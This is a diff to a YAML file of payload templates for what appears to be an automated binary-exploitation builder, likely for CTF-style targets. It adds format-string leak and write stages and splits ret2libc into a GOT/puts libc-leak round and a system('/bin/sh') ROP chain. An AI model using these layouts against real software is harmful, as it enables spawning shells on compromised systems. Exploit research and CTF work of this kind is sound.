@@ -19,7 +19,14 @@
 #   got_addr:NAME    - the GOT entry address (profiler facts)
 #   win              - the win_symbol address
 #   leak:NAME        - a leaked_address(name) fact (harvest/banner)
+#   sym:NAME         - a sym_addr(name) fact (a DEFINED symbol of a
+#                      non-PIE module: the announced-nothing twin's
+#                      stage function, argument string, buffer)
 #   const:N          - the literal N (a syscall number, an offset)
+#
+# One technique may ship several shapes: replace `layout:` with
+# `variants:` (a list of {name:, layout:}) and the builder walks them,
+# the first whose references the facts satisfy wins.
 #
 # resolved at build time from the facts + the measurement; anything the
 # facts cannot supply is a loud BuildError, never a guessed byte.
@@ -48,6 +55,21 @@ banner_leak:
   layout:
     - [padding, measured_offset]
     - [qword, leak:win]
+
+# the fmtstr class: no return slot to overwrite - the format string IS
+# the payload. The static stage is the leak (the buffer's argument
+# index comes off the frame, fact fmt_offset); the write stage derives
+# its targets from that leak at runtime (the exploit's job, not a
+# static byte layout).
+fmtstr_leak:
+  arch: any
+  layout:
+    - [fmtstr_leak, fmt_offset]
+
+fmtstr_write:
+  arch: any
+  layout:
+    - [fmtstr_leak, fmt_offset]
 ret2plt:
   arch: any
   layout:
@@ -65,9 +87,19 @@ ret2plt_leak:
 
 ret2libc:
   arch: any
-  layout:
-    - [padding, measured_offset]
-    - [chain, "gadget:ret_align", "gadget:pop_rdi_ret", "leak:binsh", "leak:system"]
+  variants:
+    # the strike: the full system("/bin/sh") chain - it needs the
+    # leak facts the exploit's leak round (or a harvest) supplies
+    - name: strike
+      layout:
+        - [padding, measured_offset]
+        - [chain, "gadget:ret_align", "gadget:pop_rdi_ret", "leak:binsh", "leak:system"]
+    # the leak round: puts(GOT[puts]) prints the raw libc pointer -
+    # the strike derives the libc base from what answers
+    - name: leak_stage
+      layout:
+        - [padding, measured_offset]
+        - [chain, "gadget:pop_rdi_ret", "got_addr:puts", "plt_addr:puts"]
 orw:
   arch: any
   layout:
